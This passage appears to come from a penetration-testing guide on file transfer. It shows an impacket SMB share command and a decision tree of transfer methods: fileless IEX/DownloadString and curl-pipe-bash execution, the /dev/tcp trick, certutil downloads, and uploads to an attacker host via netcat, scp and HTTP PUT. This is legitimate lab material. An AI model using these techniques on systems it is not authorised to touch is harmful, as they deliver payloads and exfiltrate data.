## Current operation: Serve a dedicated authenticated transfer directory

**Run in:** Kali. **Requires:** A dedicated folder, a free SMB listening port and a Windows client that can reach Kali; choose a temporary transfer credential.

```bash
mkdir -p ./transfer
sudo impacket-smbserver share ./transfer -smb2support -user transfer -password 'TRANSFER_PASSWORD'
```

**Read the result:** Verify the share name, served directory and incoming connection, then confirm the requested file on both ends.

**If Windows reaches the host but refuses the share connection:** Choose a directory intentionally; SMB client policy, authentication and port reachability can prevent transfers even when the server is listening.

**Next check:** Check existing Windows connections, credentials and SMB policy, then copy a small file before transferring the required artifact.

**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.

### Example 6: Quick Decision Tree

Run in: **Saved lab example**.

```text
DOWNLOADING TO WINDOWS:
├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
├── Only cmd.exe?       → certutil or bitsadmin
├── Internal network?   → SMB (impacket-smbserver)
├── Need fileless?      → IEX + DownloadString
└── Nothing works?      → Base64 encode/decode via clipboard

DOWNLOADING TO LINUX:
├── Have curl/wget?     → Use them (simplest)
├── Need fileless?      → curl | bash  or  wget -qO- | python3
├── Have Python/PHP?    → Use language one-liners
├── Nothing available?  → /dev/tcp bash trick
└── Need encryption?    → OpenSSL s_server/s_client

UPLOADING FROM WINDOWS:
├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
├── Internal network?   → SMB or WebDAV
└── Nothing works?      → Base64 encode → copy-paste → decode on attacker

UPLOADING FROM LINUX:
├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
├── Have SCP?           → scp file user@attacker:/path/
├── Have Python?        → python3 requests.post one-liner
└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
```
